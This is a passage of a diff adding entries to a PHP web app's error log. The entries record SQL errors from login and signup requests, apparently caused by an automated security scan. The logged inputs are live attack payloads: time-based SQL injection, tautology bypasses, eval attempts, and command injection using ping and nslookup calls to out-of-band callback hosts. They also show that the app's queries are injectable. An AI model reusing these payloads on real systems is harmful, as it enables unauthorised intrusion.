+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select*from(select(sleep(20)))a)'' AND password = 'b9b30fd11d532ccb581a42cda889' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select*from(select(sleep(20)))a)'' AND password = '9324f0e673cdb228326972c7d974' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Truncated incorrect DOUBLE value: 'LQLCxRcP@burpcollaborator.net96862276'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1901''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Truncated incorrect DOUBLE value: 'LQLCxRcP@burpcollaborator.net57707203'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Truncated incorrect DOUBLE value: 'LQLCxRcP@burpcollaborator.net70979007'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Truncated incorrect DOUBLE value: 'LQLCxRcP@burpcollaborator.net19655231'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''2325''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<akshl'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<t40ry'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<zfq7v'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+FUNCTION traffic_control.eval does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x in range(1):\n import time\n time.sleep(20)','a','single'))'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-- ' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Incorrect parameters in the call to native function 'sleep'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(hexdec(dechex(20))).''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(lc(20)).''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"`0&nslookup -q=cname il71lyn0jz08ut02y0b1o8sh68c20sopchz7nw.oastify.com.&`''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"`0&nslookup -q=cname w52f5c7e3dkme7kgievf8mcvqmwgk681wtjj78.oastify.com.&`''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'z1kmb357gp bacxnrhwsx||a #|" |echo z1kmb357gp bacxnrhwsx||a #'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-- ' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '() or ''='o' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '27e445jrk3 jq9nxusj56 #xzwx'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1 #'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<e1jvj' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<biozx' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<ruy5s' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<ynh7l' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+FUNCTION traffic_control.eval does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x in range(1):\n import time\n time.sleep(20)','a','single'))' AND password = 'b' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<m9tde' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+Incorrect parameters in the call to native function 'sleep'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(hexdec(dechex(20))).'' AND password = 'b9b30fd11d532ccb581a42cda889ed27b8' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<l0b8z' AND password = '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.sleep(lc(20)).'' AND password = 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+FUNCTION traffic_control.eval does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x in range(1):\n import time\n time.sleep(20)','a','single'))' AND password = '9' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+Incorrect parameters in the call to native function 'sleep'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
